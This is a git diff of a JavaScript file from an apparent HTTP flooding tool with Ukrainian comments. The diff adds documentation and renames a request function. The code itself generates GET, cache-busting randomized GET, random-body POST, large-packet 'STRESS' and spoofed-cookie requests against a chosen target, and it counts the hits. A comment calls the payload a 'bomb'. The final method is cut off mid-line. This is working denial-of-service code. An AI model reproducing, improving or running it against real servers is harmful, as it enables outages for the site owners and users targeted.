@@ -28,7 +28,19 @@ const MIME = {
 }
 
 
+/**
+ * Змішування заголовків
+ * @param {String} headers 
+ */
 const composeHeaders = headers => BASE_HEADERS + headers;
+
+/**
+ * Змішування заголовків для POST запитів
+ * @param {Number} cl **Довжина запиту**
+ * @param {String} ct **Тип запиту**
+ * @param {String} body **Тіло запиту**
+ * @returns JSON
+ */
 function composePostHeaders(cl, ct, body) {
 	return {
 		...POST,
@@ -40,12 +52,29 @@ function composePostHeaders(cl, ct, body) {
 		body: body
 	}
 }
+
+/**
+ * Генератор POST запиту
+ * @param {String} url **URL-Адреса**
+ */
 const composeURL = url => !url.search(/\?/) ? url + `?data=${randomString(64)}` : url;
 
+
+/**
+ * Генератор пакету
+ * @param {Number} size **Вага ~~бомби~~ пакету**
+ * @param {MIME<string>} type **Тип запиту**
+ * @returns {String}
+ */
 const Packet = (size, type) => (r=>type!=MIME.json?r:[MIME.json,`{"data": "${r}"}`])(randomString(size));
 
 
-async function requests(target, config) {
+/**
+ * Генератор запиту
+ * @param {String} target **Ціль**
+ * @param {JSON} config **Конфіг**
+ */
+async function request(target, config) {
 	return await fetch(
 		target,
 		{...BASIC_MODES, ...config}
@@ -54,23 +83,30 @@ async function requests(target, config) {
 	.then(add_count);
 }
 
+/**
+ * Методи
+ */
 class Methods {
+	/**
+	 * Конструктор
+	 * @param {String} target **Ціль**
+	 */
 	constructor(target) {
 		this.target = [target]
 	} 
 	async GET() {
-		await requests(this.target[0], GET)
+		return await request(this.target[0], GET)
 	}
 	async RGET() {
-		await requests(composeURL(this.target[0]), GET)
+		return await request(composeURL(this.target[0]), GET)
 	}
 	async POST() {
-		await requests(this.target[0], 
+		return await request(this.target[0], 
 			composePostHeaders(76, ...Packet(64, MIME.json))
 		)
 	}
 	async STRESS(big_packets) {
-		await requests(this.target[0], 
+		return await request(this.target[0], 
 			big_packets?
 			composePostHeaders(
 				2060, ...Packet(2048, MIME.json)
@@ -82,7 +118,7 @@ class Methods {
 		)
 	}
 	async COOKIE() {
-		await requests(this.target[0], {
+		return await request(this.target[0], {
 			...POST,
 			headers: composeHeaders(
 				`Cookie: _ga=GA${getRandomArbitrary(1000, 99999)};
